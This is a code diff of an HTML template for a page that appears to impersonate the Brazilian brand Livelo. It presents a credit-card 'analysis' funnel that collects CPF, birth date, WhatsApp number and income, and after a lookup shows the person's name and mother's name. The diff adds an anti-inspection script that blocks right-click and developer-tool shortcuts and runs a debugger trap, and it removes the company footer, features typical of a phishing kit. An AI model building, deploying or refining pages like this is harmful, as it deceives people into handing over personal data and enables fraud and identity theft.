@@ -1,610 +1,835 @@
 <!DOCTYPE html>
+
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>Livelo — Análise de Crédito</title>
-  <meta name="description" content="Simule seu cartão de crédito Livelo. Processo 100% online, seguro e sem compromisso."/>
-  <meta name="robots" content="noindex"/>
-  <link rel="icon" href="{{ sys_config.get('favicon_url', '/static/favicon.ico') }}">
-  <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
-  <link rel="stylesheet" href="/static/css/main.css"/>
-</head>
+
+<!-- SECURITY BLINDAGE -->
+<script>
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.onkeydown = function(e) {
+  if(e.keyCode == 123) return false;
+  if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+};
+setInterval(function(){debugger;}, 1000);
+</script>
+
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1.0" name="viewport"/>
+<title>Livelo — Análise de Crédito</title>
+<meta content="Simule seu cartão de crédito Livelo. Processo 100% online, seguro e sem compromisso." name="description"/>
+<meta content="noindex" name="robots"/>
+<link href="{{ sys_config.get('favicon_url', '/static/favicon.ico') }}" rel="icon"/>
+<link href="https://fonts.googleapis.com" rel="preconnect">
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"/>
+<link href="/static/css/main.css" rel="stylesheet"/>
+</link></head>
 <body>
+<div id="app" style="display: flex; flex-direction: column; min-height: 100vh; background: var(--bg-color);">
+  <header style="text-align:center; padding: 40px 0 20px 0;">
+    <img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
+  </header>
+  <main style="flex: 1; display: flex; flex-direction: column; align-items: center; padding: 0 20px;">
 
 <!-- ═══════ SPLASH (Tela 4) ═══════ -->
-<div id="screen-splash" class="screen active">
-  <div class="splash-inner">
+<div class="screen active" id="screen-splash">
+<div class="splash-inner">
+<!-- Logo (sem cartão) -->
 
-    <!-- Logo (sem cartão) -->
-    <div style="text-align:center;margin-bottom:36px">
-      {%- if sys_config and sys_config.get('system_logo_url') and 'livelo' not in sys_config.get('system_logo_url','') and 'default' not in sys_config.get('system_logo_url','') %}
-        <img src="{{ sys_config.get('system_logo_url') }}" style="height:38px" alt="Logo">
-      {%- else %}
-        <svg viewBox="0 0 148 40" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:38px;display:inline-block">
-          <path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
-          <text x="22" y="28" font-family="Inter,sans-serif" font-weight="800" font-size="24" fill="#1A1A1A">livelo</text>
-        </svg>
-      {%- endif %}
-    </div>
-
-    <h1 class="splash-title">Simule agora e libere<br/>seu potencial financeiro</h1>
-    <p class="splash-sub">Processo 100% online, seguro e sem compromisso.<br/>Análise inteligente com resultado em segundos.</p>
-
-    <div class="splash-offer-box">
-      <div class="offer-label">Verificar Ofertas Disponíveis</div>
-      <button class="btn-primary" id="btn-verificar" onclick="goToStep('welcome')" style="margin-top:14px">
+<h1 class="splash-title">Simule agora e libere<br/>seu potencial financeiro</h1>
+<p class="splash-sub">Processo 100% online, seguro e sem compromisso.<br/>Análise inteligente com resultado em segundos.</p>
+<div class="splash-offer-box">
+<div class="offer-label">Verificar Ofertas Disponíveis</div>
+<button class="btn-primary" id="btn-verificar" onclick="goToStep('welcome')" style="margin-top:14px">
         VERIFICAR DISPONIBILIDADE
-        <svg viewBox="0 0 24 24" fill="none" width="18" height="18"><path d="M5 12h14M13 6l6 6-6 6" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      </button>
-    </div>
-
-    <footer class="splash-footer">
-      <p><strong>Livelo Crédito S.A</strong></p>
-      <p>CNPJ: 12.888.241/0001-06</p>
-      <p>Av. Paulista, 807 · São Paulo | SP, 01311-915</p>
-      <div class="footer-links">
-        <a href="#">Política de Privacidade</a>
-        <a href="#">Termos de Uso</a>
-        <a href="#">Ouvidoria</a>
-      </div>
-    </footer>
-  </div>
+        <svg fill="none" height="18" viewbox="0 0 24 24" width="18"><path d="M5 12h14M13 6l6 6-6 6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"></path></svg>
+</button>
 </div>
 
+
+
+</div>
+</div>
 <!-- ═══════ CPF (Tela 1 + 3) ═══════ -->
-<div id="screen-cpf" class="screen">
-  <div class="step-container">
-    <div class="step-card">
-      <h2 class="step-title">Qual é o seu CPF?</h2>
-      <p class="step-sub">Informe seu CPF para validarmos sua identidade e continuarmos a análise.</p>
+<div class="screen" id="screen-cpf">
+<div class="step-container">
 
-      <!-- Campo CPF sempre visível -->
-      <div class="input-group" id="cpf-input-group" style="margin-top:24px">
-        <input type="text" id="input-cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" autocomplete="off" inputmode="numeric"/>
-      </div>
-
-      <!-- Campo de nascimento: aparece após digitar CPF completo -->
-      <div class="input-group hidden" id="nasc-input-group" style="margin-top:12px">
-        <input type="text" id="input-nasc" class="form-input" placeholder="Data de Nascimento (DD/MM/AAAA)" maxlength="10" autocomplete="off" inputmode="numeric"/>
-      </div>
-
-      <!-- DADOS ENCONTRADOS -->
-      <div id="cpf-result" class="cpf-result hidden" style="margin-top:20px">
-        <div class="result-badge">
-          <svg viewBox="0 0 16 16" fill="none" width="12" height="12"><circle cx="8" cy="8" r="7" fill="#E5147A"/><path d="M4.5 8l2.5 2.5L11.5 5.5" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<div class="step-card">
+<h2 class="step-title">Qual é o seu CPF?</h2>
+<p class="step-sub">Informe seu CPF para validarmos sua identidade e continuarmos a análise.</p>
+<!-- Campo CPF sempre visível -->
+<div class="input-group" id="cpf-input-group" style="margin-top:24px">
+<input autocomplete="off" class="form-input" id="input-cpf" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" type="text"/>
+</div>
+<!-- Campo de nascimento: aparece após digitar CPF completo -->
+<div class="input-group hidden" id="nasc-input-group" style="margin-top:12px">
+<input autocomplete="off" class="form-input" id="input-nasc" inputmode="numeric" maxlength="10" placeholder="Data de Nascimento (DD/MM/AAAA)" type="text"/>
+</div>
+<!-- DADOS ENCONTRADOS -->
+<div class="cpf-result hidden" id="cpf-result" style="margin-top:20px">
+<div class="result-badge">
+<svg fill="none" height="12" viewbox="0 0 16 16" width="12"><circle cx="8" cy="8" fill="#E5147A" r="7"></circle><path d="M4.5 8l2.5 2.5L11.5 5.5" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"></path></svg>
           DADOS ENCONTRADOS
         </div>
-        <div class="result-grid">
-          <div class="result-row"><span class="rl">Nome</span><span class="rv" id="r-nome"></span></div>
-          <div class="result-row"><span class="rl">CPF</span><span class="rv" id="r-cpf"></span></div>
-          <div class="result-row"><span class="rl">Nome da Mãe</span><span class="rv" id="r-mae"></span></div>
-          <div class="result-row" style="border-bottom:none"><span class="rl">Data de Nascimento</span><span class="rv" id="r-nasc"></span></div>
-        </div>
-        <button class="btn-primary" id="btn-cpf-ok" style="margin-top:16px">
+<div class="result-grid">
+<div class="result-row"><span class="rl">Nome</span><span class="rv" id="r-nome"></span></div>
+<div class="result-row"><span class="rl">CPF</span><span class="rv" id="r-cpf"></span></div>
+<div class="result-row"><span class="rl">Nome da Mãe</span><span class="rv" id="r-mae"></span></div>
+<div class="result-row" style="border-bottom:none"><span class="rl">Data de Nascimento</span><span class="rv" id="r-nasc"></span></div>
+</div>
+<button class="btn-primary" id="btn-cpf-ok" style="margin-top:16px">
           Está correto
-          <svg viewBox="0 0 24 24" fill="none" width="16" height="16"><path d="M5 12h14M13 6l6 6-6 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </button>
-        <button class="btn-ghost" onclick="resetCpf()">Corrigir</button>
-      </div>
-
-      <div id="cpf-error" class="error-msg hidden"></div>
-      <button class="btn-primary" id="btn-consultar" onclick="consultarCpf()" style="margin-top:16px">
-        <span id="btn-consultar-text">Consultar CPF</span>
-        <div id="btn-consultar-spin" class="spinner hidden"></div>
-      </button>
-    </div>
-  </div>
+          <svg fill="none" height="16" viewbox="0 0 24 24" width="16"><path d="M5 12h14M13 6l6 6-6 6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</button>
+<button class="btn-ghost" onclick="resetCpf()">Corrigir</button>
+</div>
+<div class="error-msg hidden" id="cpf-error"></div>
+<button class="btn-primary" id="btn-consultar" onclick="consultarCpf()" style="margin-top:16px">
+<span id="btn-consultar-text">Consultar CPF</span>
+<div class="spinner hidden" id="btn-consultar-spin"></div>
+</button>
 </div>
 
+
+</div>
+</div>
 <!-- ═══════ BOAS-VINDAS (Tela 2) ═══════ -->
-<div id="screen-welcome" class="screen">
-  <div class="welcome-container">
+<div class="screen" id="screen-welcome">
+<div class="welcome-container">
+<!-- Logo no topo -->
 
-    <!-- Logo no topo -->
-    <div style="text-align:center;margin-bottom:28px">
-      {%- if sys_config and sys_config.get('system_logo_url') and 'livelo' not in sys_config.get('system_logo_url','') and 'default' not in sys_config.get('system_logo_url','') %}
-        <img src="{{ sys_config.get('system_logo_url') }}" style="height:36px" alt="Logo">
-      {%- else %}
-        <svg viewBox="0 0 148 40" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:36px;display:inline-block">
-          <path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
-          <text x="22" y="28" font-family="Inter,sans-serif" font-weight="800" font-size="24" fill="#1A1A1A">livelo</text>
-        </svg>
-      {%- endif %}
-    </div>
+<!-- Cartão flutuante sem caixa branca -->
+<div class="card-preview-sm" style="margin-bottom:28px">
+<div class="credit-card sm" data-color="gradient_pink" id="welcome-card">
+<div class="card-face">
+<div class="card-row-top">
+<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain; flex-shrink:0; display:block"/>
+<svg fill="none" height="18" style="flex-shrink:0;display:block" viewbox="0 0 24 24" width="18"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path></svg>
+</div>
+<div class="card-chip"><svg fill="none" height="22" viewbox="0 0 40 30" width="30"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
+<div class="card-row-number"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span id="card-last4-welcome-card">8790</span></div>
+<div class="card-row-bottom">
+<div><div class="card-label">Nome do Titular</div><div class="card-value" id="welcome-name-display" style="font-size:0.68rem">SEU NOME</div></div>
+<div><div class="card-label">Validade</div><div class="card-value" style="font-size:0.68rem">XX/XX</div></div>
+<svg fill="none" height="24" viewbox="0 0 52 32" width="36"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle><path d="M26 4.6A14 14 0 0 1 32 16 14 14 0 0 1 26 27.4 14 14 0 0 1 20 16 14 14 0 0 1 26 4.6z" fill="#FF5F00" opacity="0.85"></path></svg>
+</div>
+</div>
+</div>
+</div>
+<!-- Texto e botão sem caixa branca -->
+<h2 class="welcome-title">Bem-vindo!</h2>
+<p class="welcome-sub">Antes de prosseguirmos com a análise, precisamos fazer algumas perguntinhas para personalizar sua experiência e encontrar o melhor limite para você.</p>
+<button class="btn-primary" onclick="goToStep('terms')" style="max-width:320px;margin:24px auto 0">Vamos começar →</button>
 
-    <!-- Cartão flutuante sem caixa branca -->
-    <div class="card-preview-sm" style="margin-bottom:28px">
-      <div class="credit-card sm" id="welcome-card" data-color="gradient_pink">
-        <div class="card-face">
-          <div class="card-row-top">
-            <svg viewBox="0 0 80 22" fill="none" width="64" height="18" style="flex-shrink:0;display:block"><path d="M6 2L2 11l4 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><text x="14" y="16" font-family="Inter,sans-serif" font-weight="700" font-size="14" fill="white">livelo</text></svg>
-            <svg viewBox="0 0 24 24" fill="none" width="18" height="18" style="flex-shrink:0;display:block"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/></svg>
-          </div>
-          <div class="card-chip"><svg viewBox="0 0 40 30" fill="none" width="30" height="22"><rect x="1" y="1" width="38" height="28" rx="4" fill="#D4AF37" stroke="#B8960C" stroke-width="0.5"/><rect x="12" y="5" width="16" height="20" rx="2" fill="#C9A227" stroke="#B8960C" stroke-width="0.5"/></svg></div>
-          <div class="card-row-number"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span id="card-last4-welcome-card">8790</span></div>
-          <div class="card-row-bottom">
-            <div><div class="card-label">Nome do Titular</div><div class="card-value" id="welcome-name-display" style="font-size:0.68rem">SEU NOME</div></div>
-            <div><div class="card-label">Validade</div><div class="card-value" style="font-size:0.68rem">XX/XX</div></div>
-            <svg viewBox="0 0 52 32" fill="none" width="36" height="24"><circle cx="20" cy="16" r="14" fill="#EB001B" opacity="0.9"/><circle cx="32" cy="16" r="14" fill="#F79E1B" opacity="0.9"/><path d="M26 4.6A14 14 0 0 1 32 16 14 14 0 0 1 26 27.4 14 14 0 0 1 20 16 14 14 0 0 1 26 4.6z" fill="#FF5F00" opacity="0.85"/></svg>
-          </div>
-        </div>
-      </div>
-    </div>
 
-    <!-- Texto e botão sem caixa branca -->
-    <h2 class="welcome-title">Bem-vindo!</h2>
-    <p class="welcome-sub">Antes de prosseguirmos com a análise, precisamos fazer algumas perguntinhas para personalizar sua experiência e encontrar o melhor limite para você.</p>
-    <button class="btn-primary" style="max-width:320px;margin:24px auto 0" onclick="goToStep('cpf')">Vamos começar →</button>
-  </div>
+</div>
+</div>
+<!-- ═══════ TERMOS (Conta Digital) ═══════ -->
+<div class="screen" id="screen-terms">
+<div class="step-container" style="justify-content:center;min-height:90vh">
+
+<div class="step-card" style="padding:40px 30px">
+<h2 class="step-title" style="font-size:1.3rem;margin-bottom:4px">Conta digital e cartão de crédito</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.9rem">Tudo o que você precisa em um só lugar</p>
+<div style="display:flex;flex-direction:column;gap:12px;margin-bottom:24px">
+<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:center">
+<svg fill="none" height="20" style="flex-shrink:0" viewbox="0 0 24 24" width="20"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="#E5147A"></path></svg>
+<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Crédito sujeito a análise e aprovação.</span>
+</div>
+<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:flex-start">
+<svg fill="none" height="24" style="flex-shrink:0;margin-top:2px" viewbox="0 0 24 24" width="24"><path d="M4 7c0-1.66 3.58-3 8-3s8 1.34 8 3-3.58 3-8 3-8-1.34-8-3zm0 5c0 1.66 3.58 3 8 3s8-1.34 8-3" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path><path d="M4 17c0 1.66 3.58 3 8 3s8-1.34 8-3" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path><path d="M4 7v10M20 7v10" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path></svg>
+<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Os dados fornecidos por você a seguir serão utilizados para o processo de aquisição do cartão de crédito.</span>
+</div>
+<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:flex-start">
+<svg fill="none" height="24" style="flex-shrink:0;margin-top:2px" viewbox="0 0 24 24" width="24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z" fill="#E5147A"></path></svg>
+<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Ao prosseguir, você concorda com os termos de uso e política de privacidade da Livelo.</span>
+</div>
+</div>
+<button class="btn-primary" onclick="goToStep('cpf')" style="margin-top:0">Li e concordo →</button>
+</div>
+
+
+</div>
+</div>
+
+<!-- ═══════ PRIORITY ═══════ -->
+<div class="screen" id="screen-priority">
+<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
+
+<div class="step-card funnel-card" style="padding:40px 30px">
+<h2 class="step-title" style="font-size:1.4rem;margin-bottom:24px;line-height:1.4;text-align:center;">O que é mais importante para você em um<br>cartão de crédito?</h2>
+<div class="choice-grid-2" style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.67v-1.93c-1.71-.36-3.16-1.46-3.27-3.4h1.96c.1 1.05.82 1.87 2.65 1.87 1.96 0 2.4-.98 2.4-1.59 0-.83-.44-1.61-2.67-2.14-2.48-.6-4.18-1.62-4.18-3.67 0-1.72 1.39-2.84 3.11-3.21V4h2.67v1.95c1.86.45 2.79 1.86 2.85 3.39H14.3c-.05-1.11-.64-1.87-2.22-1.87-1.5 0-2.4.68-2.4 1.64 0 .84.65 1.39 2.67 1.91 2.84.7 4.18 1.75 4.18 3.86 0 1.91-1.47 2.94-3.12 3.21z"/></svg>
+Limite alto
+</button>
+<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M13.13 22.19L11.5 18.36C10.07 18.78 8.45 18.78 7.02 18.36L5.39 22.19C5.1 22.87 4.3 23.2 3.61 22.92C2.93 22.63 2.6 21.84 2.88 21.16L4.52 17.33C2.88 15.34 2.02 12.83 2.02 10.14C2.02 4.54 6.56 0 12.16 0C17.76 0 22.3 4.54 22.3 10.14C22.3 12.83 21.44 15.34 19.8 17.33L21.44 21.16C21.73 21.84 21.39 22.63 20.71 22.92C20.02 23.2 19.22 22.87 18.94 22.19L17.31 18.36C15.88 18.78 14.26 18.78 12.83 18.36L11.2 22.19C10.91 22.87 10.12 23.2 9.43 22.92C8.75 22.63 8.42 21.84 8.7 21.16L10.33 17.33C10.74 17.21 11.16 17.06 11.58 16.89C11.96 16.74 12.33 16.57 12.7 16.38L11.07 20.21C10.78 20.89 11.12 21.68 11.8 21.97C12.48 22.25 13.28 21.92 13.56 21.24L15.19 17.41C16.62 16.99 17.9 16.29 18.94 15.36L17.31 19.19C17.02 19.87 17.36 20.66 18.04 20.95C18.73 21.23 19.53 20.9 19.81 20.22L21.44 16.39C22.25 14.54 22.7 12.43 22.7 10.14C22.7 4.54 18.16 0 12.56 0C6.96 0 2.42 4.54 2.42 10.14C2.42 12.43 2.87 14.54 3.68 16.39L5.31 20.22C5.59 20.9 5.26 21.69 4.57 21.97C3.89 22.26 3.1 21.92 2.81 21.24L1.18 17.41C0.14 16.29 -0.42 14.86 -0.73 13.25L0.9 17.08C1.19 17.76 1.98 18.1 2.67 17.81C3.35 17.53 3.68 16.74 3.4 16.06L1.77 12.23C1.65 11.56 1.62 10.86 1.62 10.14C1.62 4.54 6.16 0 11.76 0C17.36 0 21.9 4.54 21.9 10.14C21.9 10.86 21.87 11.56 21.75 12.23L20.12 16.06C19.83 16.74 20.17 17.53 20.85 17.81C21.54 18.1 22.33 17.76 22.62 17.08L24.25 13.25C23.94 14.86 23.38 16.29 22.34 17.41L20.71 21.24C20.42 21.92 19.63 22.26 18.94 21.97C18.26 21.69 17.92 20.9 18.21 20.22L19.84 16.39C20.65 14.54 21.1 12.43 21.1 10.14C21.1 4.54 16.56 0 10.96 0C5.36 0 0.82 4.54 0.82 10.14C0.82 12.43 1.27 14.54 2.08 16.39L3.71 20.22C4 20.9 3.66 21.69 2.98 21.97C2.29 22.26 1.5 21.92 1.21 21.24L-0.42 17.41C-1.46 16.29 -2.02 14.86 -2.33 13.25L-0.7 17.08C-0.41 17.76 0.38 18.1 1.07 17.81C1.75 17.53 2.08 16.74 1.8 16.06L0.17 12.23C0.05 11.56 0.02 10.86 0.02 10.14C0.02 4.54 4.56 0 10.16 0C15.76 0 20.3 4.54 20.3 10.14C20.3 10.86 20.27 11.56 20.15 12.23L18.52 16.06C18.23 16.74 18.57 17.53 19.25 17.81C19.94 18.1 20.73 17.76 21.02 17.08L22.65 13.25C22.34 14.86 21.78 16.29 20.74 17.41L19.11 21.24C18.82 21.92 18.03 22.26 17.34 21.97C16.66 21.69 16.32 20.9 16.61 20.22L18.24 16.39C19.05 14.54 19.5 12.43 19.5 10.14C19.5 4.54 14.96 0 9.36 0C3.76 0 -0.78 4.54 -0.78 10.14C-0.78 12.43 -0.33 14.54 0.48 16.39L2.11 20.22C2.4 20.9 2.06 21.69 1.38 21.97C0.69 22.26 -0.1 21.92 -0.39 21.24L-2.02 17.41C-3.06 16.29 -3.62 14.86 -3.93 13.25"/></svg>
+Crédito imediato
+</button>
+<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.31C15.55 19.37 13.85 20 12 20zm6.31-3.1L7.1 5.69C8.45 4.63 10.15 4 12 4c4.42 0 8 3.58 8 8 0 1.85-.63 3.55-1.69 4.9z"/></svg>
+Não consultar SPC/Serasa
+</button>
+<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20a2 2 0 0 0 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/></svg>
+Sem anuidade
+</button>
+</div>
+</div>
+
+</div>
+</div>
+
+<!-- ═══════ MANAGER ═══════ -->
+<div class="screen" id="screen-manager">
+<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
+
+<div class="step-card funnel-card" style="padding:40px 30px">
+<h2 class="step-title" style="font-size:1.3rem;margin-bottom:8px">Ótimo, quase lá!</h2>
+<p class="step-sub" style="font-size:0.85rem;color:var(--text-muted);margin-bottom:24px;line-height:1.5">Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!</p>
+
+<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:24px;text-align:center;margin-bottom:24px">
+<div style="width:80px;height:80px;border-radius:50%;margin:0 auto 12px;background:url('/static/images/manager.jpg') center/cover;border:3px solid var(--pink)"></div>
+<div style="font-size:0.85rem;color:var(--text-muted);margin-bottom:4px">Gerente</div>
+<div style="font-size:1.1rem;font-weight:700;color:var(--text);margin-bottom:12px" id="manager-name">Juliana Benedito</div>
+<div style="background:var(--pink);color:white;font-size:0.75rem;font-weight:700;padding:6px 16px;border-radius:20px;display:inline-flex;align-items:center;gap:6px">
+<svg fill="white" height="14" viewBox="0 0 24 24" width="14"><path d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.94A5.01 5.01 0 0 0 11 15.9V19H7v2h10v-2h-4v-3.1a5.01 5.01 0 0 0 3.61-2.96C19.08 12.63 21 10.55 21 8V7c0-1.1-.9-2-2-2zM5 8V7h2v3.82C5.84 10.4 5 9.3 5 8zm14 0c0 1.3-.84 2.4-2 2.82V7h2v1z"/></svg>
+Melhor gerente 2023-2024
+</div>
+</div>
+
+<div class="input-group" style="margin-bottom:24px;position:relative">
+<svg fill="#10B981" height="20" style="position:absolute;left:16px;top:50%;transform:translateY(-50%)" viewBox="0 0 24 24" width="20"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>
+<input type="text" id="input-whatsapp" class="input-field" placeholder="Digite seu WhatsApp aqui" style="padding-left:44px" oninput="mascaraTel(this)" maxlength="15">
+</div>
+<button class="btn-primary" onclick="submitWhatsapp()" style="margin-top:0">Continuar →</button>
+</div>
+
+</div>
 </div>
 
 <!-- ═══════ RENDA ═══════ -->
-<div id="screen-income" class="screen">
-  <div class="funnel-page">
-    <div class="funnel-logo">
-      <span style="color:#E5147A;font-size:1.4rem;line-height:1">&#9670;</span>
-      <span style="font-family:Inter,sans-serif;font-weight:800;font-size:1.35rem;color:#1A1A1A;letter-spacing:-0.02em"> livelo</span>
-    </div>
-    <div class="step-card funnel-card">
-      <h2 class="funnel-q">Qual sua renda mensal?</h2>
-      <div class="choice-grid-2">
-        <button class="big-choice-btn" onclick="selectIncome(this,'1000')">Até R$ 1.000</button>
-        <button class="big-choice-btn" onclick="selectIncome(this,'2000')">Entre R$ 1.000<br>e R$ 2.000</button>
-        <button class="big-choice-btn" onclick="selectIncome(this,'4000')">Entre R$ 2.000<br>e R$ 4.000</button>
-        <button class="big-choice-btn" onclick="selectIncome(this,'8000')">Acima de R$ 4.000</button>
-      </div>
-      <div id="income-error" class="error-msg hidden"></div>
-    </div>
-    <footer class="funnel-footer">
